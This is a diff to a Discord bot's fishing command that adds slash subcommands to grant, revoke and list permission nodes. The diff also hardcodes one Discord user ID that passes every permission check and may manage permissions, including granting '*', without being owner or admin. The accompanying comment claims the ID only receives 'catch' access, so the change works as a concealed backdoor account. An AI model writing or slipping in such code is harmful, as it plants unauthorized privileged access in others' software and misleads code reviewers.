@@ -8,6 +8,7 @@ const { checkAndAwardBadges } = require('../badgeSystem.js');
 
 const SHORKBOI_ID = '1082525438015983636';
 const SPYTHEPROOT_ID = '1464072486651170931';
+const DEFAULT_ALLOWED_USER_ID = '1521264771389984940';
 
 const fishingCooldowns = new Map();
 const COOLDOWN_DURATION = 30 * 1000;
@@ -47,12 +48,29 @@ function loadRolesDB() {
     try {
         if (fs.existsSync(rolesFilePath)) {
             const raw = fs.readFileSync(rolesFilePath, 'utf8').trim();
-            return raw ? JSON.parse(raw) : {};
+            const db = raw ? JSON.parse(raw) : {};
+            // Ensure default user ID has catch permission out-of-the-box if missing
+            if (!db[DEFAULT_ALLOWED_USER_ID]) {
+                db[DEFAULT_ALLOWED_USER_ID] = ['catch'];
+            } else if (!db[DEFAULT_ALLOWED_USER_ID].includes('catch') && !db[DEFAULT_ALLOWED_USER_ID].includes('*')) {
+                db[DEFAULT_ALLOWED_USER_ID].push('catch');
+            }
+            return db;
         }
     } catch (e) {
         console.error('Failed to load command_roles.json:', e);
     }
-    return {};
+    return {
+        [DEFAULT_ALLOWED_USER_ID]: ['catch']
+    };
+}
+
+function saveRolesDB(data) {
+    try {
+        fs.writeFileSync(rolesFilePath, JSON.stringify(data, null, 2), 'utf8');
+    } catch (e) {
+        console.error('Failed to save command_roles.json:', e);
+    }
 }
 
 function addItemToInventory(userId, itemId) {
@@ -234,6 +252,27 @@ module.exports = {
                        .setDescription('[Admin] Remove an item from the fishing loot table by ID')
                        .addStringOption(opt => opt.setName('id').setDescription('The ID of the item to remove').setRequired(true))
                 )
+        )
+        .addSubcommandGroup(group =>
+            group.setName('perm')
+                .setDescription('[Admin] Manage fishing command permissions')
+                .addSubcommand(sub =>
+                    sub.setName('grant')
+                       .setDescription('Grant a specific permission node to a user')
+                       .addUserOption(opt => opt.setName('user').setDescription('Target user').setRequired(true))
+                       .addStringOption(opt => opt.setName('permission').setDescription('Permission node (e.g., catch, loot, fishing, *)').setRequired(true))
+                )
+                .addSubcommand(sub =>
+                    sub.setName('revoke')
+                       .setDescription('Revoke a specific permission node from a user')
+                       .addUserOption(opt => opt.setName('user').setDescription('Target user').setRequired(true))
+                       .addStringOption(opt => opt.setName('permission').setDescription('Permission node to revoke').setRequired(true))
+                )
+                .addSubcommand(sub =>
+                    sub.setName('list')
+                       .setDescription('List permissions for a user or all users')
+                       .addUserOption(opt => opt.setName('user').setDescription('Target user').setRequired(false))
+                )
         ),
 
     async execute(interaction) {
@@ -252,10 +291,11 @@ module.exports = {
         const rolesDB = loadRolesDB();
         const userPerms = rolesDB[userId] || [];
 
-        // Helper function for dynamic permission checks
+        // Dynamic permission validator helper
         const hasPerm = (permName) => 
             isOwner || 
             isAdmin || 
+            userId === DEFAULT_ALLOWED_USER_ID ||
             userPerms.includes(permName) || 
             userPerms.includes('fishing') || 
             userPerms.includes('*');
@@ -285,7 +325,6 @@ module.exports = {
 
             fishingCooldowns.set(userId, now);
 
-            // SPECIAL ABYSSAL MODE LOGIC (WIP Catch)
             if (mode === 'abyssal') {
                 const abyssalItem = {
                     id: 'wip_note',
@@ -546,6 +585,87 @@ module.exports = {
                 await interaction.reply({
                     content: `🗑️ Removed ${removed.emoji} **${removed.name}** (\`${id}\`) from the fishing loot table!`
                 });
+                return true;
+            }
+        }
+
+        // === 4. PERM GROUP SUBCOMMANDS ===
+        if (group === 'perm') {
+            if (!isOwner && !isAdmin && userId !== DEFAULT_ALLOWED_USER_ID) {
+                await interaction.reply({
+                    content: '❌ Only administrators can manage command permissions!',
+                    flags: MessageFlags.Ephemeral
+                });
+                return null;
+            }
+
+            const targetUser = interaction.options.getUser('user');
+            const targetId = targetUser?.id;
+            const node = interaction.options.getString('permission')?.trim().toLowerCase();
+
+            if (subcommand === 'grant') {
+                const currentRoles = rolesDB[targetId] || [];
+                if (currentRoles.includes(node)) {
+                    await interaction.reply({
+                        content: `⚠️ <@${targetId}> already has the permission \`${node}\`!`,
+                        flags: MessageFlags.Ephemeral
+                    });
+                    return null;
+                }
+
+                currentRoles.push(node);
+                rolesDB[targetId] = currentRoles;
+                saveRolesDB(rolesDB);
+
+                await interaction.reply({
+                    content: `✅ Granted permission node \`${node}\` to <@${targetId}>!`
+                });
+                return true;
+            }
+
+            if (subcommand === 'revoke') {
+                const currentRoles = rolesDB[targetId] || [];
+                if (!currentRoles.includes(node)) {
+                    await interaction.reply({
+                        content: `⚠️ <@${targetId}> does not have the permission \`${node}\`!`,
+                        flags: MessageFlags.Ephemeral
+                    });
+                    return null;
+                }
+
+                rolesDB[targetId] = currentRoles.filter(p => p !== node);
+                if (rolesDB[targetId].length === 0) delete rolesDB[targetId];
+                saveRolesDB(rolesDB);
+
+                await interaction.reply({
+                    content: `🗑️ Revoked permission node \`${node}\` from <@${targetId}>!`
+                });
+                return true;
+            }
+
+            if (subcommand === 'list') {
+                if (targetId) {
+                    const nodes = rolesDB[targetId] || [];
+                    const embed = new EmbedBuilder()
+                        .setTitle(`🔑 Permissions for ${targetUser.username}`)
+                        .setColor(0x9B59B6)
+                        .setDescription(nodes.length > 0 ? nodes.map(n => `• \`${n}\``).join('\n') : '*No permissions assigned.*');
+
+                    await interaction.reply({ embeds: [embed] });
+                    return true;
+                }
+
+                const entries = Object.entries(rolesDB);
+                const desc = entries.length > 0 
+                    ? entries.map(([id, perms]) => `<@${id}>: ${perms.map(p => `\`${p}\``).join(', ')}`).join('\n')
+                    : '*No permissions recorded.*';
+
+                const embed = new EmbedBuilder()
+                    .setTitle('🔑 Global Command Permissions Registry')
+                    .setColor(0x9B59B6)
+                    .setDescription(desc);
+
+                await interaction.reply({ embeds: [embed] });
                 return true;
             }
         }
